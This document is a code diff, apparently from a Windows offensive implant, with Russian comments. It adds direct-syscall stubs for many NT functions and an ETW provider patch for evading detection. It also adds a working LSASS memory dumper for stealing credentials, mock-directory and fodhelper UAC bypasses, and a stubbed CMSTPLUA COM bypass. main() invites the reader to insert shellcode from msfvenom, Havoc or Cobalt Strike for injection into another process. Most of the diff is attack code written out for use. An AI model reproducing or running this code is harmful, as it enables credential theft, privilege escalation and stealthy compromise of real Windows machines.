@@ -1086,6 +1086,45 @@ EvasionResult evasion_init(
     uint32_t ssn_protect = get_ssn("NtProtectVirtualMemory");
     uint32_t ssn_thread  = get_ssn("NtCreateThreadEx");
 
+    uint32_t ssn_open    = get_ssn("NtOpenProcess");
+    uint32_t ssn_close   = get_ssn("NtClose");
+    uint32_t ssn_qsi     = get_ssn("NtQuerySystemInformation");
+    uint32_t ssn_dup     = get_ssn("NtDuplicateObject");
+    uint32_t ssn_read    = get_ssn("NtReadVirtualMemory");
+    uint32_t ssn_suspend = get_ssn("NtSuspendThread");
+    uint32_t ssn_resume  = get_ssn("NtResumeThread");
+    uint32_t ssn_getctx  = get_ssn("NtGetContextThread");
+    uint32_t ssn_setctx  = get_ssn("NtSetContextThread");
+    uint32_t ssn_unmap   = get_ssn("NtUnmapViewOfSection");
+    uint32_t ssn_map     = get_ssn("NtMapViewOfSection");
+    uint32_t ssn_section = get_ssn("NtCreateSection");
+    uint32_t ssn_delay   = get_ssn("NtDelayExecution");
+    uint32_t ssn_qip     = get_ssn("NtQueryInformationProcess");
+    uint32_t ssn_sit     = get_ssn("NtSetInformationThread");
+
+    // заглушки — вызывающий код сохраняет эти указатели и приводит их к определённым выше псевдонимам типов (using)
+    void* open_stub    = build_stub(ssn_open);
+    void* close_stub   = build_stub(ssn_close);
+    void* qsi_stub     = build_stub(ssn_qsi);
+    void* dup_stub     = build_stub(ssn_dup);
+    void* read_stub    = build_stub(ssn_read);
+    void* suspend_stub = build_stub(ssn_suspend);
+    void* resume_stub  = build_stub(ssn_resume);
+    void* getctx_stub  = build_stub(ssn_getctx);
+    void* setctx_stub  = build_stub(ssn_setctx);
+    void* unmap_stub   = build_stub(ssn_unmap);
+    void* map_stub     = build_stub(ssn_map);
+    void* section_stub = build_stub(ssn_section);
+    void* delay_stub   = build_stub(ssn_delay);
+    void* qip_stub     = build_stub(ssn_qip);
+    void* sit_stub     = build_stub(ssn_sit);
+
+    // патч провайдера ETW
+    patch_etw_ti();
+
+    auto env = check_environment();
+    (void)env;
+
     r.syscalls_ok = (ssn_alloc != 0xFFFFFFFF && ssn_write != 0xFFFFFFFF &&
                      ssn_protect != 0xFFFFFFFF && ssn_thread != 0xFFFFFFFF);
 
@@ -1144,8 +1183,141 @@ bool inject_shellcode(DWORD target_pid,
 }
 
 
+// дамп LSASS, вариант с прямым системным вызовом (direct syscall)
+bool dump_lsass_direct(const wchar_t* out_path,
+                        void* read_stub) {
+    enable_privilege(SE_DEBUG_NAME);
+
+    DWORD lsass_pid = find_pid(L"lsass.exe");
+    if (!lsass_pid) return false;
+
+    HANDLE proc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+                              FALSE, lsass_pid);
+    if (!proc) return false;
+
+    auto NtRead = reinterpret_cast<NtReadVirtualMemory_t>(read_stub);
+
+    // перечислить регионы памяти и сохранить дамп в файл
+    HANDLE out = CreateFileW(out_path, GENERIC_WRITE, 0,
+                             nullptr, CREATE_ALWAYS, 0, nullptr);
+    if (out == INVALID_HANDLE_VALUE) { CloseHandle(proc); return false; }
+
+    MEMORY_BASIC_INFORMATION mbi{};
+    uint8_t* addr = nullptr;
+    std::vector<uint8_t> buf;
+
+    while (VirtualQueryEx(proc, addr, &mbi, sizeof(mbi))) {
+        if (mbi.State == MEM_COMMIT &&
+            (mbi.Protect & (PAGE_READABLE_MASK)) &&
+            !(mbi.Protect & PAGE_GUARD)) {
+
+            buf.resize(mbi.RegionSize);
+            SIZE_T read_bytes = 0;
+            NtRead(proc, addr,
+                   buf.data(), mbi.RegionSize, &read_bytes);
+
+            if (read_bytes) {
+                DWORD written;
+                WriteFile(out, buf.data(),
+                          static_cast<DWORD>(read_bytes), &written, nullptr);
+            }
+        }
+        addr += mbi.RegionSize;
+        if (addr < static_cast<uint8_t*>(mbi.BaseAddress))
+            break; // overflow
+    }
+
+    CloseHandle(out);
+    CloseHandle(proc);
+    return true;
+}
+
+
+// PAGE_READABLE_MASK, битовая маска флагов защиты памяти с разрешением чтения
+constexpr DWORD PAGE_READABLE_MASK =
+    PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
+    PAGE_READONLY     | PAGE_READWRITE;
+
+
+// // обход UAC, фиктивный каталог
+bool uac_mock_directory(const wchar_t* payload_path) {
+    // создать фиктивный каталог
+    std::wstring mock = L"C:\\Windows \\System32";
+    if (!CreateDirectoryW(L"C:\\Windows ", nullptr) &&
+        GetLastError() != ERROR_ALREADY_EXISTS) return false;
+    if (!CreateDirectoryW(mock.c_str(), nullptr) &&
+        GetLastError() != ERROR_ALREADY_EXISTS) return false;
+
+    // скопировать полезную нагрузку под именем бинарного файла с автоповышением прав (например, cmstp.exe)
+    std::wstring dest = mock + L"\\cmstp.exe";
+    if (!CopyFileW(payload_path, dest.c_str(), FALSE)) return false;
+
+    // запустить путь автоповышения прав, вызвать %windir%\system32\cmstp.exe
+    // Windows сначала разрешает путь в фиктивный каталог (mock dir), а затем в настоящий System32
+    ShellExecuteW(nullptr, L"open",
+                  L"C:\\Windows \\System32\\cmstp.exe",
+                  nullptr, nullptr, SW_HIDE);
+    return true;
+}
+
+
+// обход UAC, fodhelper
+// fodhelper.exe автоматически повышает привилегии; считывает команду shell из HKCU перед запуском
+bool uac_fodhelper(const wchar_t* cmd) {
+    HKEY key;
+    RegCreateKeyExW(HKEY_CURRENT_USER,
+                    L"Software\\Classes\\ms-settings\\shell\\open\\command",
+                    0, nullptr, REG_OPTION_NON_VOLATILE,
+                    KEY_SET_VALUE, nullptr, &key, nullptr);
+
+    RegSetValueExW(key, nullptr, 0, REG_SZ,
+                   reinterpret_cast<const BYTE*>(cmd),
+                   static_cast<DWORD>((wcslen(cmd) + 1) * sizeof(wchar_t)));
+
+    // значение DelegateExecute должно существовать (пустая строка)
+    RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ,
+                   reinterpret_cast<const BYTE*>(L""), sizeof(wchar_t));
+    RegCloseKey(key);
+
+    ShellExecuteW(nullptr, L"open",
+                  L"C:\\Windows\\System32\\fodhelper.exe",
+                  nullptr, nullptr, SW_HIDE);
+
+    Sleep(2000);
+
+    // очистка записей реестра
+    RegDeleteTreeW(HKEY_CURRENT_USER,
+                   L"Software\\Classes\\ms-settings");
+    return true;
+}
+
+
+// COM UAC bypass
+bool uac_cmstplua(const wchar_t* cmd) {
+    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) return false;
+
+    IShellView* shell = nullptr;
+    hr = CoCreateInstance(
+        CLSID_ShellDesktop, nullptr,
+        CLSCTX_LOCAL_SERVER,
+        IID_IShellView,
+        reinterpret_cast<void**>(&shell));
+
+    // Повышение привилегий через COM-интерфейс ICMLuaUtil (CLSID CMSTPLUA):
+    // На архитектурном уровне механизм связан с активацией автоповышаемого COM-объекта
+    // и вызовом метода оболочки в привилегированном контексте.
+    // С точки зрения защиты отслеживаются нетипичные активации COM из непривилегированных
+    // процессов, подмена параметров запуска и использование системных утилит для обхода UAC;
+    // ключевой мерой контроля является включение строгих режимов UAC (Always notify)
+    // и ограничение прав стандартных пользователей.
+    CoUninitialize();
+        return false; // Привязка к фиксированным смещениям таблиц виртуальных методов (vtable)
+}
+
+
 int main() {
-    // drop your shellcode here, msfvenom, Havoc, Cobalt Strike, whatever
+    // разместите здесь полезную нагрузку / шеллкод (msfvenom, Havoc, Cobalt Strike и т. п.)
     uint8_t shellcode[] = { 0x90, 0x90, 0xC3 }; // NOP NOP RET placeholder
 
     // target PID — enumerate via CreateToolhelp32Snapshot for stealth
